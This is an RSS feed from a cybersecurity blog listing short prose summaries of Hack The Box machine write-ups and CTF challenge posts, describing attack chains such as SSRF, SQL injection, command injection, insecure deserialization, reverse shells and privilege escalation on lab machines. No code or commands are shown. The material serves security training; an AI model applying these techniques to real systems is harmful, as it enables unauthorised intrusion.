<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>7Rocky's Blog. Cybersecurity and Maths</title><link>https://7rocky.github.io/en/</link><description>Recent content on 7Rocky's Blog. Cybersecurity and Maths</description><generator>Hugo</generator><language>en</language><lastBuildDate>Thu, 23 May 2024 14:25:42 +0200</lastBuildDate><atom:link href="https://7rocky.github.io/en/index.xml" rel="self" type="application/rss+xml"/><item><title>Newsletter 15/02/2024</title><link>https://7rocky.github.io/en/newsletters/2024-02-15/</link><pubDate>Thu, 15 Feb 2024 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2024-02-15/</guid><description>Sau Hack The Box. Linux. Easy machine 6 minutes to read This machine has a web application that is vulnerable to SSRF, which can be used to read the contents of an internal server, which is vulnerable to command injection. The two vulnerabilities can be chained to get RCE on the machine. The low-privileged user is able to run systemctl as root using sudo, which leads to the privilege escalation via the default pager less</description></item><item><title>RegistryTwo</title><link>https://7rocky.github.io/en/htb/registrytwo/</link><pubDate>Sat, 03 Feb 2024 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/registrytwo/</guid><description>Hack The Box. Linux. Insane machine. This machine exposes a web application that allows to create custom domains with HTML code. Moreover, there is a Docker registry exposed where we can download Docker image blobs after getting a suitable JWT token. The web application is running a WAR file with Tomcat, we can decompile it and see that it queries a RMI server. Since Tomcat is behind an nginx reverse proxy, we can access some sensitive Tomcat &lt;em>servlets&lt;/em> to modify our session and set manager permissions on the web application. We need this to modify the RMI configuration using a mass assignment vulnerability and point the RMI server to us. After that, we can exploit an insecure deserialization vulnerability in Java to get RCE in a container. Then, we can interact with the legitimate RMI server using port forwarding. This server allows us to read arbitrary files with a directory traversal attack. We can find a plaintext password for user &lt;code>developer&lt;/code>, which is reused in SSH. Then, &lt;code>root&lt;/code> is executing a JAR file to analyze files of the hosting website by sending them to a ClamAV server. The problem here is that the JAR calls functions from the RMI register, which is restarted periodically. Therefore, we can craft a malicious RMI registry and exploit win a race condition to take the port, so that &lt;code>root&lt;/code> queries our malicious registry and talks to our fake ClamAV server. The result is that all files at &lt;code>/root&lt;/code> will be quarantined inside a readable directory, which leads to the privilege escalation</description></item><item><title>Newsletter 14/01/2024</title><link>https://7rocky.github.io/en/newsletters/2024-01-14/</link><pubDate>Sun, 14 Jan 2024 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2024-01-14/</guid><description>Pilgrimage Hack The Box. Linux. Easy machine 13 minutes to read This machine has a website that exposes a Git repository. We are able to extract the PHP source of the web application and find out that it uses ImageMagick under the hood to process uploaded images. The version of ImageMagick has a local file read vulnerability that can be used to read a SQLite database file and find a plaintext password for emily, which is used in SSH too.</description></item><item><title>Sau</title><link>https://7rocky.github.io/en/htb/sau/</link><pubDate>Sat, 06 Jan 2024 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/sau/</guid><description>Hack The Box. Linux. Easy machine. This machine has a web application that is vulnerable to SSRF, which can be used to read the contents of an internal server, which is vulnerable to command injection. The two vulnerabilities can be chained to get RCE on the machine. The low-privileged user is able to run &lt;code>systemctl&lt;/code> as &lt;code>root&lt;/code> using &lt;code>sudo&lt;/code>, which leads to the privilege escalation via the default pager &lt;code>less&lt;/code></description></item><item><title>Newsletter 28/11/2023</title><link>https://7rocky.github.io/en/newsletters/2023-11-28/</link><pubDate>Tue, 28 Nov 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-11-28/</guid><description>Sandworm Hack The Box. Linux. Medium machine 25 minutes to read This machine has a website that allows to encrypt, decrypt and verify signatures using PGP. The website is vulnerable to SSTI in Flask, which is the way to access the machine as atlas. However, this environment is limited due to firejail, but we are able to find a plaintext password to login as silentobserver in SSH. As this user, we are able to modify a Rust project that is used in another Rust project that runs periodically as atlas.</description></item><item><title>Pilgrimage</title><link>https://7rocky.github.io/en/htb/pilgrimage/</link><pubDate>Sat, 25 Nov 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/pilgrimage/</guid><description>Hack The Box. Linux. Easy machine. This machine has a website that exposes a Git repository. We are able to extract the PHP source of the web application and find out that it uses ImageMagick under the hood to process uploaded images. The version of ImageMagick has a local file read vulnerability that can be used to read a SQLite database file and find a plaintext password for &lt;code>emily&lt;/code>, which is used in SSH too. After that, we find that &lt;code>root&lt;/code> executes a Bash script that uses &lt;code>binwalk&lt;/code> to remove malware from uploaded image files. The version of &lt;code>binwalk&lt;/code> is vulnerable to Remote Code Execution, which leads to the privilege escalation</description></item><item><title>Sandworm</title><link>https://7rocky.github.io/en/htb/sandworm/</link><pubDate>Sat, 18 Nov 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/sandworm/</guid><description>Hack The Box. Linux. Medium machine. This machine has a website that allows to encrypt, decrypt and verify signatures using PGP. The website is vulnerable to SSTI in Flask, which is the way to access the machine as &lt;code>atlas&lt;/code>. However, this environment is limited due to &lt;code>firejail&lt;/code>, but we are able to find a plaintext password to login as &lt;code>silentobserver&lt;/code> in SSH. As this user, we are able to modify a Rust project that is used in another Rust project that runs periodically as &lt;code>atlas&lt;/code>. With this power, we can get access as &lt;code>atlas&lt;/code> again, but outside &lt;code>firejail&lt;/code>. Finally, since &lt;code>firejail&lt;/code> is a SUID binary, we can use a public exploit to become &lt;code>root&lt;/code></description></item><item><title>Newsletter 08/11/2023</title><link>https://7rocky.github.io/en/newsletters/2023-11-08/</link><pubDate>Wed, 08 Nov 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-11-08/</guid><description>Topology Hack The Box. Linux. Easy machine 5 minutes to read This machine contains a website that allows to generate equations using LaTeX. With this feature we can read arbitrary files from the server with LaTeX injection techniques and find a hashed password for another subdomain, which can be cracked. This password is reused in SSH. After that, root is executing gnuplot scripts periodically, which leads to the privilege escalation</description></item><item><title>Topology</title><link>https://7rocky.github.io/en/htb/topology/</link><pubDate>Sat, 04 Nov 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/topology/</guid><description>Hack The Box. Linux. Easy machine. This machine contains a website that allows to generate equations using LaTeX. With this feature we can read arbitrary files from the server with LaTeX injection techniques and find a hashed password for another subdomain, which can be cracked. This password is reused in SSH. After that, &lt;code>root&lt;/code> is executing &lt;code>gnuplot&lt;/code> scripts periodically, which leads to the privilege escalation</description></item><item><title>Newsletter 16/10/2023</title><link>https://7rocky.github.io/en/newsletters/2023-10-16/</link><pubDate>Mon, 16 Oct 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-10-16/</guid><description>Intentions Hack The Box. Linux. Hard machine 19 minutes to read This machine has a website with an API that is vulnerable to second-order SQLi. Then, there is an authentication mechanism that just requires the password hash, so we can take a hash from the dumped database and log in as an administrator. Then, there is a vulnerability involving PHP and ImageMagick that leads to RCE. Once in the machine, we can pivot to user greg by analyzing a Git repository and finding plaintext credentials.</description></item><item><title>Intentions</title><link>https://7rocky.github.io/en/htb/intentions/</link><pubDate>Sat, 14 Oct 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/intentions/</guid><description>Hack The Box. Linux. Hard machine. This machine has a website with an API that is vulnerable to second-order SQLi. Then, there is an authentication mechanism that just requires the password hash, so we can take a hash from the dumped database and log in as an administrator. Then, there is a vulnerability involving PHP and ImageMagick that leads to RCE. Once in the machine, we can pivot to user &lt;code>greg&lt;/code> by analyzing a Git repository and finding plaintext credentials. After that, we are allowed to run a custom binary that hashes a given length of a file and compares the result with a set of pre-computed MD5 hashes. This binary has a capability that allows to read files as &lt;code>root&lt;/code>, which can be used to extract all the contents of any file after automating the process, which allows to read an SSH private key for &lt;code>root&lt;/code></description></item><item><title>Newsletter 05/09/2023</title><link>https://7rocky.github.io/en/newsletters/2023-09-05/</link><pubDate>Tue, 05 Sep 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-09-05/</guid><description>MonitorsTwo Hack The Box. Linux. Easy machine 13 minutes to read This machine has a Cacti service that is vulnerable to unauthenticated Remote Code Execution that grants access to a Docker container. Here we can find credentials in the database and reuse them for SSH on the host machine. Then, we find out that the Docker version is vulnerable to a CVE. To exploit this, we need to get root in the container and configure a SUID binary that will be executed from the host machine via directory traversal to escalate privileges</description></item><item><title>MonitorsTwo</title><link>https://7rocky.github.io/en/htb/monitorstwo/</link><pubDate>Sat, 02 Sep 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/monitorstwo/</guid><description>Hack The Box. Linux. Easy machine. This machine has a Cacti service that is vulnerable to unauthenticated Remote Code Execution that grants access to a Docker container. Here we can find credentials in the database and reuse them for SSH on the host machine. Then, we find out that the Docker version is vulnerable to a CVE. To exploit this, we need to get &lt;code>root&lt;/code> in the container and configure a SUID binary that will be executed from the host machine via directory traversal to escalate privileges</description></item><item><title>Newsletter 18/08/2023</title><link>https://7rocky.github.io/en/newsletters/2023-08-18/</link><pubDate>Fri, 18 Aug 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-08-18/</guid><description>Don't Overreact Hack The Box. Challenges. Mobile 2 minutes to read React Native. Minified JavaScript code analysis
Roulette Hack The Box. Challenges. Crypto 17 minutes to read PRNG. Custom Mersenne Twister. System of equations with binary variables
Right Decision CTFZone Quals 2023 6 minutes to read Shamir Secret Sharing. System of equations
Come on feel the nonce CTFZone Quals 2023 7 minutes to read ECDSA. Biased nonces. Hidden Number Problem.</description></item><item><title>Newsletter 11/07/2023</title><link>https://7rocky.github.io/en/newsletters/2023-07-11/</link><pubDate>Tue, 11 Jul 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-07-11/</guid><description>Waiting List Hack The Box. Challenges. Crypto 7 minutes to read ECDSA. Nonces with known bits. Hidden Number Problem. LLL lattice reduction
CryptoConundrum Hack The Box. Challenges. Crypto 11 minutes to read AES cipher. Frequency analysis. Depth-first search
Walkie Hackie Hack The Box. Challenges. Hardware 5 minutes to read Radiofrequency analysis
Eat the Cake! Hack The Box. Challenges. Reversing 7 minutes to read UPX. Revert password checking
Hissss Hack The Box.</description></item><item><title>Newsletter 27/06/2023</title><link>https://7rocky.github.io/en/newsletters/2023-06-27/</link><pubDate>Tue, 27 Jun 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-06-27/</guid><description>Stocker Hack The Box. Linux. Easy machine 8 minutes to read This machine has a website that is vulnerable to NoSQL injection. Using this vulnerability, we can bypass authentication. Then, we have a feature to convert an HTML output into PDF, being able to perform a Server-Side XSS attack to read files from the server, such as source code. Then we find a plaintext password that is reused in SSH.</description></item><item><title>Stocker</title><link>https://7rocky.github.io/en/htb/stocker/</link><pubDate>Sat, 24 Jun 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/stocker/</guid><description>Hack The Box. Linux. Easy machine. This machine has a website that is vulnerable to NoSQL injection. Using this vulnerability, we can bypass authentication. Then, we have a feature to convert an HTML output into PDF, being able to perform a Server-Side XSS attack to read files from the server, such as source code. Then we find a plaintext password that is reused in SSH. Finally, a user is able to run Node.js scripts with &lt;code>sudo&lt;/code> in a path that matches a wildcard. Bypassing this wildcard is needed to escalate privileges</description></item><item><title>Escape</title><link>https://7rocky.github.io/en/htb/escape/</link><pubDate>Sat, 17 Jun 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/escape/</guid><description>Hack The Box. Windows. Medium machine. This machine shares a PDF file via SMB and shows credentials to access Microsoft SQL Server. Here, we are able to use &lt;code>xp_dirtree&lt;/code> to list an external SMB share and crack the NTLMv2 hash. After that, we can access the machine, read the logs of Microsoft SQL Server and discover the password of another user. Then, we find some vulnerable certificate templates that can be abused to authenticate as &lt;code>Administrator&lt;/code></description></item><item><title>Soccer</title><link>https://7rocky.github.io/en/htb/soccer/</link><pubDate>Sat, 10 Jun 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/soccer/</guid><description>Hack The Box. Linux. Easy machine. This machine contains a Tiny File Manager application that allows us to upload and execute PHP, so we can obtain a reverse shell as &lt;code>www-data&lt;/code>. In the machine, we can read the configuration for nginx and find another subdomain. This one exposes a WebSocket server that is vulnerable to Boolean-based Blind SQLi. By exploiting SQLi, we can find plaintext credentials that are reused in SSH. Finally, the user is allowed to run &lt;code>dstat&lt;/code> as &lt;code>root&lt;/code> using &lt;code>doas&lt;/code>, and we are able to create a plugin to escalate privileges</description></item><item><title>Bagel</title><link>https://7rocky.github.io/en/htb/bagel/</link><pubDate>Sat, 03 Jun 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/bagel/</guid><description>Hack The Box. Linux. Medium machine. This machine has website that is vulnerable to Local File Read. With this, we can read the web application source code and see that there is a WebSocket server that uses C# .NET with a DLL to process the messages. We can download and reverse the DLL to read the C# source code. The program deserializes JSON data and there is a flaw that allows us to reuse a class of the codebase to read arbitrary files from the server. With this, we can read the private SSH key of a user, and then switch to another user with a password that is also stored in the DLL. This user is able to run &lt;code>dotnet&lt;/code> with &lt;code>sudo&lt;/code>, which can be used to escalate privileges</description></item><item><title>Newsletter 23/05/2023</title><link>https://7rocky.github.io/en/newsletters/2023-05-23/</link><pubDate>Tue, 23 May 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-05-23/</guid><description>Precious Hack The Box. Linux. Easy machine 8 minutes to read This machine contains a web application that uses a tool to create PDF documents which is vulnerable to command injection, which leads to Remote Code Execution (RCE). Then, we can find plaintext credentials to switch to another user. And this user has sudo permissions to run a Ruby script that is vulnerable to insecure deserialization in YAML, which can be used to execute commands as root</description></item><item><title>Precious</title><link>https://7rocky.github.io/en/htb/precious/</link><pubDate>Sat, 20 May 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/precious/</guid><description>Hack The Box. Linux. Easy machine. This machine contains a web application that uses a tool to create PDF documents which is vulnerable to command injection, which leads to Remote Code Execution (RCE). Then, we can find plaintext credentials to switch to another user. And this user has &lt;code>sudo&lt;/code> permissions to run a Ruby script that is vulnerable to insecure deserialization in YAML, which can be used to execute commands as &lt;code>root&lt;/code></description></item><item><title>Newsletter 16/05/2023</title><link>https://7rocky.github.io/en/newsletters/2023-05-16/</link><pubDate>Tue, 16 May 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-05-16/</guid><description>Interface Hack The Box. Linux. Medium machine 12 minutes to read This machine has a dummy Next.js website that exposes a subdomain in the Content-Security-Policy header. There, we can enumerate third-party dependencies like dompdf. This one is vulnerable to Remote Code Execution. After a lot of enumeration to interact with dompdf, we find a way to get a reverse shell on the system. Then, user root executes a shell script each minute, and the script is vulnerable to command injection, which must be exploited by adding malicious metadata to a temporary file.</description></item><item><title>Interface</title><link>https://7rocky.github.io/en/htb/interface/</link><pubDate>Sat, 13 May 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/interface/</guid><description>Hack The Box. Linux. Medium machine. This machine has a dummy Next.js website that exposes a subdomain in the &lt;code>Content-Security-Policy&lt;/code> header. There, we can enumerate third-party dependencies like &lt;code>dompdf&lt;/code>. This one is vulnerable to Remote Code Execution. After a lot of enumeration to interact with &lt;code>dompdf&lt;/code>, we find a way to get a reverse shell on the system. Then, user &lt;code>root&lt;/code> executes a shell script each minute, and the script is vulnerable to command injection, which must be exploited by adding malicious metadata to a temporary file. By chaining these steps, we are able to get a reverse shell as &lt;code>root&lt;/code></description></item><item><title>MetaTwo</title><link>https://7rocky.github.io/en/htb/metatwo/</link><pubDate>Sat, 29 Apr 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/metatwo/</guid><description>Hack The Box. Linux. Easy machine. This machine has a WordPress website that uses a plugin that is vulnerable to SQLi. Then we can get password hashes and crack one of them to get access to the WordPress dashboard. The version of WordPress is vulnerable to out-of-band XXE using a WAV file that allows to read files from the server. Using this vulnerability, we can find plaintext credentials for FTP. In this service we have another PHP file with more plaintext credentials that are valid for SSH. Once inside the machine, we can see some PGP keys and messages that can be decrypted to find the password for &lt;code>root&lt;/code></description></item><item><title>Newsletter 25/04/2023</title><link>https://7rocky.github.io/en/newsletters/2023-04-25/</link><pubDate>Tue, 25 Apr 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-04-25/</guid><description>Investigation Hack The Box. Linux. Medium machine 7 minutes to read This machine has a website that allows to analyze image file metadata with exiftool. However, the version is vulnerable to command injection and can be used to access the system. Then, we find some Windows event logs and a plaintext password as username, probably a mistake. After that, we gain access as another user that is able to execute a binary with sudo, which behind the scenes runs a Perl script that leads to the privilege escalation</description></item><item><title>Investigation</title><link>https://7rocky.github.io/en/htb/investigation/</link><pubDate>Sat, 22 Apr 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/investigation/</guid><description>Hack The Box. Linux. Medium machine. This machine has a website that allows to analyze image file metadata with &lt;code>exiftool&lt;/code>. However, the version is vulnerable to command injection and can be used to access the system. Then, we find some Windows event logs and a plaintext password as username, probably a mistake. After that, we gain access as another user that is able to execute a binary with &lt;code>sudo&lt;/code>, which behind the scenes runs a Perl script that leads to the privilege escalation</description></item><item><title>Newsletter 17/04/2023</title><link>https://7rocky.github.io/en/newsletters/2023-04-17/</link><pubDate>Mon, 17 Apr 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-04-17/</guid><description>Vessel Hack The Box. Linux. Hard machine 15 minutes to read This machine has a website that exposes a Git repository. Here we can read the source code of the web application and find out a way to bypass authentication in MySQL with Type Juggling. Then, we find another subdomain that has a public exploit to get RCE. After that, we discover a password generator tool that can be reverse-engineered to generate multiple passwords and crack a password-protected PDF document.</description></item><item><title>BroScience</title><link>https://7rocky.github.io/en/htb/broscience/</link><pubDate>Sat, 08 Apr 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/broscience/</guid><description>Hack The Box. Linux. Medium machine. This machine has a website with a Local File Read vulnerability that can be used to read PHP source code and find a way to activate a new account. Then, we can perform a deserialization attack in PHP to get RCE. After that, we find a hashed password in the database that can be cracked and it is reused in the system. Finally, there&amp;rsquo;s a Cron task running by &lt;code>root&lt;/code> to renew OpenSSL certificates and the script has a command injection vulnerability, which leads to the privilege escalation</description></item><item><title>Vessel</title><link>https://7rocky.github.io/en/htb/vessel/</link><pubDate>Sat, 25 Mar 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/vessel/</guid><description>Hack The Box. Linux. Hard machine. This machine has a website that exposes a Git repository. Here we can read the source code of the web application and find out a way to bypass authentication in MySQL with Type Juggling. Then, we find another subdomain that has a public exploit to get RCE. After that, we discover a password generator tool that can be reverse-engineered to generate multiple passwords and crack a password-protected PDF document. Then, we get access via SSH and see that we can use &lt;code>sysctl&lt;/code> as &lt;code>root&lt;/code> with &lt;code>pinns&lt;/code> as SUID binary. With this, we can modify the kernel configuration to run an arbitrary script with a program crashes, which leads to the privilege escalation</description></item><item><title>Newsletter 08/03/2023</title><link>https://7rocky.github.io/en/newsletters/2023-03-08/</link><pubDate>Wed, 08 Mar 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-03-08/</guid><description>Forgot Hack The Box. Linux. Medium machine 12 minutes to read This machine has a website that is vulnerable to password reset poisoning and web cache poisoning. Both vulnerabilities can be used to gain access with a normal account and then get the administrator&amp;rsquo;s cookie, respectively. After that, we can read a ticket with SSH credentials. Then, we can run a Machine Learning script as root using sudo, and there is a library with a vulnerable version where we can inject Python code to escalate privileges</description></item><item><title>Forgot</title><link>https://7rocky.github.io/en/htb/forgot/</link><pubDate>Sat, 04 Mar 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/forgot/</guid><description>Hack The Box. Linux. Medium machine. This machine has a website that is vulnerable to password reset poisoning and web cache poisoning. Both vulnerabilities can be used to gain access with a normal account and then get the administrator&amp;rsquo;s cookie, respectively. After that, we can read a ticket with SSH credentials. Then, we can run a Machine Learning script as &lt;code>root&lt;/code> using &lt;code>sudo&lt;/code>, and there is a library with a vulnerable version where we can inject Python code to escalate privileges</description></item><item><title>Newsletter 28/02/2023</title><link>https://7rocky.github.io/en/newsletters/2023-02-28/</link><pubDate>Tue, 28 Feb 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-02-28/</guid><description>Awkward Hack The Box. Linux. Medium machine 22 minutes to read This machine has a website built in Vue.js that exposes a login form which can be easily bypassed. Then we find an API endpoint that tests connectivity of other websites, which can be exploited using Server-Side Request Forgery to find an internal API documentation. There we have some Node.js code to analyze and see how we can bypass some checks to obtain all the users information and crack a password hash.</description></item><item><title>Awkward</title><link>https://7rocky.github.io/en/htb/awkward/</link><pubDate>Sat, 25 Feb 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/awkward/</guid><description>Hack The Box. Linux. Medium machine. This machine has a website built in Vue.js that exposes a login form which can be easily bypassed. Then we find an API endpoint that tests connectivity of other websites, which can be exploited using Server-Side Request Forgery to find an internal API documentation. There we have some Node.js code to analyze and see how we can bypass some checks to obtain all the users information and crack a password hash. After that, we can log in, get a valid JWT token and crack it to find the secret. Therefore, we can forge any JWT token, which means we can inject any payload as token information. Using this power, we can read arbitrary files from the server exploiting &lt;code>awk&lt;/code> and find plaintext credentials inside a compressed archive. Next, we can access via SSH and find out another website built with PHP with two vulnerabilities. There is also a Cron task that takes information from a CSV file to send an email. The key here is to inject a malicious parameter in the CSV file so that the &lt;code>mail&lt;/code> command executes a malicious script, which leads to the privilege escalation</description></item><item><title>Newsletter 22/02/2023</title><link>https://7rocky.github.io/en/newsletters/2023-02-22/</link><pubDate>Wed, 22 Feb 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-02-22/</guid><description>RainyDay Hack The Box. Linux. Hard machine 25 minutes to read This machine has a website vulnerable to user enumeration. Then we can use brute force a user&amp;rsquo;s password and run containers. Using a container we can access an internal website that has an API that shows sensitive information using Type Juggling and has a feature for matching regular expressions on given files, so that we can read source code and get the secret key for Flask.</description></item><item><title>RainyDay</title><link>https://7rocky.github.io/en/htb/rainyday/</link><pubDate>Sat, 18 Feb 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/rainyday/</guid><description>Hack The Box. Linux. Hard machine. This machine has a website vulnerable to user enumeration. Then we can use brute force a user&amp;rsquo;s password and run containers. Using a container we can access an internal website that has an API that shows sensitive information using Type Juggling and has a feature for matching regular expressions on given files, so that we can read source code and get the secret key for Flask. Then, we can forge a session for user &lt;code>jack&lt;/code> and find out that the Docker containers allow to access process information from the machine, and we can read the private SSH key of this user. Next, we can run a custom Python interpreter and escape the sandbox to get a shell as &lt;code>jack_adm&lt;/code>. Finally, we have a tool to generate hashes with &lt;code>bcrypt&lt;/code>, and we need to exploit a limitation of &lt;code>bcrypt&lt;/code> to extract a secret pepper string and then crack &lt;code>root&lt;/code>&amp;rsquo;s hash in order to escalate privileges</description></item><item><title>Newsletter 13/02/2023</title><link>https://7rocky.github.io/en/newsletters/2023-02-13/</link><pubDate>Mon, 13 Feb 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-02-13/</guid><description>Photobomb Hack The Box. Linux. Easy machine 8 minutes to read This machine contains a web application built with Sinatra that is vulnerable to command injection, which leads to Remote Code Execution (RCE). The user has sudo permissions to run a Bash script that is vulnerable to PATH hijacking, which can be used to escalate privileges
Kryptos Support Hack The Box. Challenges. Web 6 minutes to read Cross-Site Scripting. Insecure Direct Object Reference</description></item><item><title>Photobomb</title><link>https://7rocky.github.io/en/htb/photobomb/</link><pubDate>Sat, 11 Feb 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/photobomb/</guid><description>Hack The Box. Linux. Easy machine. This machine contains a web application built with Sinatra that is vulnerable to command injection, which leads to Remote Code Execution (RCE). The user has &lt;code>sudo&lt;/code> permissions to run a Bash script that is vulnerable to &lt;code>PATH&lt;/code> hijacking, which can be used to escalate privileges</description></item><item><title>Newsletter 08/02/2023</title><link>https://7rocky.github.io/en/newsletters/2023-02-08/</link><pubDate>Wed, 08 Feb 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-02-08/</guid><description>baby todo or not todo Hack The Box. Challenges. Web 4 minutes to read Broken Access Control
baby website rick Hack The Box. Challenges. Web 3 minutes to read Insecure deserialization with pickle
Optimus Prime Hack The Box. Challenges. Crypto 4 minutes to read RSA. Greatest Common Divisor
Easy DSA: Elated once ImaginaryCTF 24/01/2023 8 minutes to read 100 points. DSA. LCG. Modular system of equations
Easy DSA: Lovely Little Lane ImaginaryCTF 21/01/2023 4 minutes to read 125 points.</description></item><item><title>Newsletter 31/01/2023</title><link>https://7rocky.github.io/en/newsletters/2023-01-31/</link><pubDate>Tue, 31 Jan 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-01-31/</guid><description>Ambassador Hack The Box. Linux. Medium machine 11 minutes to read This machine has a Grafana instance that is vulnerable to Directory Path Traversal without authentication. There, we can read files from the server and find the password for Grafana and for MySQL. After that, we can connect to MySQL, which is exposed, and find another password to access via SSH. The machine runs consul internally with a vulnerable configuration.</description></item><item><title>Ambassador</title><link>https://7rocky.github.io/en/htb/ambassador/</link><pubDate>Sat, 28 Jan 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/ambassador/</guid><description>Hack The Box. Linux. Medium machine. This machine has a Grafana instance that is vulnerable to Directory Path Traversal without authentication. There, we can read files from the server and find the password for Grafana and for MySQL. After that, we can connect to MySQL, which is exposed, and find another password to access via SSH. The machine runs &lt;code>consul&lt;/code> internally with a vulnerable configuration. After finding an authentication token in a Git repository, we can use an exploit to get RCE from &lt;code>consul&lt;/code> and get access as &lt;code>root&lt;/code></description></item><item><title>Newsletter 24/01/2023</title><link>https://7rocky.github.io/en/newsletters/2023-01-24/</link><pubDate>Tue, 24 Jan 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-01-24/</guid><description>UpDown Hack The Box. Linux. Medium machine 13 minutes to read This machine has a website that has a development directory and exposes a Git repository. Using this, we can find some functionality that is hidden except for developers and can be abused to get RCE after planning the attack and bypassing disable_functions in PHP. In the machine, there&amp;rsquo;s a SUID binary compiled out of a Python script, which can be abused with a library hijacking attack.</description></item><item><title>UpDown</title><link>https://7rocky.github.io/en/htb/updown/</link><pubDate>Sat, 21 Jan 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/updown/</guid><description>Hack The Box. Linux. Medium machine. This machine has a website that has a development directory and exposes a Git repository. Using this, we can find some functionality that is hidden except for developers and can be abused to get RCE after planning the attack and bypassing &lt;code>disable_functions&lt;/code> in PHP. In the machine, there&amp;rsquo;s a SUID binary compiled out of a Python script, which can be abused with a library hijacking attack. Finally, the developer user is able to run &lt;code>easy_install&lt;/code> with &lt;code>sudo&lt;/code>, which leads to the privilege escalation</description></item><item><title>Newsletter 16/01/2023</title><link>https://7rocky.github.io/en/newsletters/2023-01-16/</link><pubDate>Mon, 16 Jan 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-01-16/</guid><description>Shoppy Hack The Box. Linux. Easy machine 8 minutes to read This machine website that is vulnerable to NoSQL injection. Using this vulnerability, we can bypass authentication and list some hashed passwords that can be cracked. Then, we enumerate subdomains and find a MatterMost application in which we can access and find credentials for SSH in the machine. The first user is able to run a custom ELF binary that shows more credentials when using a specific master password.</description></item><item><title>Shoppy</title><link>https://7rocky.github.io/en/htb/shoppy/</link><pubDate>Sat, 14 Jan 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/shoppy/</guid><description>Hack The Box. Linux. Easy machine. This machine has a website that is vulnerable to NoSQL injection. Using this vulnerability, we can bypass authentication and list some hashed passwords that can be cracked. Then, we enumerate subdomains and find a MatterMost application in which we can access and find credentials for SSH in the machine. The first user is able to run a custom ELF binary that shows more credentials when using a specific master password. Finally, we can escalate privileges because the second user belongs to group docker</description></item><item><title>Newsletter 08/01/2023</title><link>https://7rocky.github.io/en/newsletters/2023-01-08/</link><pubDate>Sun, 08 Jan 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2023-01-08/</guid><description>Health Hack The Box. Linux. Medium machine 18 minutes to read This machine has a webhook functionality that seems vulnerable to Server-Side Request Forgery. After trying some bypasses, we see that the SSRF attack can be performed using a redirection. Internally, there is an outdated Gogs version that is vulnerable to SQLi. Once found a payload to extract password hashes from the database, we can obtain and crack the hashes from the remote Gogs instance with SQLi through SSRF.</description></item><item><title>Health</title><link>https://7rocky.github.io/en/htb/health/</link><pubDate>Sat, 07 Jan 2023 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/htb/health/</guid><description>Hack The Box. Linux. Medium machine. This machine has a webhook functionality that seems vulnerable to Server-Side Request Forgery. After trying some bypasses, we see that the SSRF attack can be performed using a redirection. Internally, there is an outdated Gogs version that is vulnerable to SQLi. Once found a payload to extract password hashes from the database, we can obtain and crack the hashes from the remote Gogs instance with SQLi through SSRF. Then, we can connect with SSH and find out that we can enter local paths in the database to read files from the server as root. This write-up uses a custom Python script to perform the SSRF attack and another Go program to crack Gogs hashes</description></item><item><title>Newsletter 19/12/2022</title><link>https://7rocky.github.io/en/newsletters/2022-12-19/</link><pubDate>Mon, 19 Dec 2022 00:00:00 +0100</pubDate><guid>https://7rocky.github.io/en/newsletters/2022-12-19/</guid><description>Space Hack The Box. Challenges. Pwn 5 minutes to read 32-bit binary. Buffer Overflow. Custom 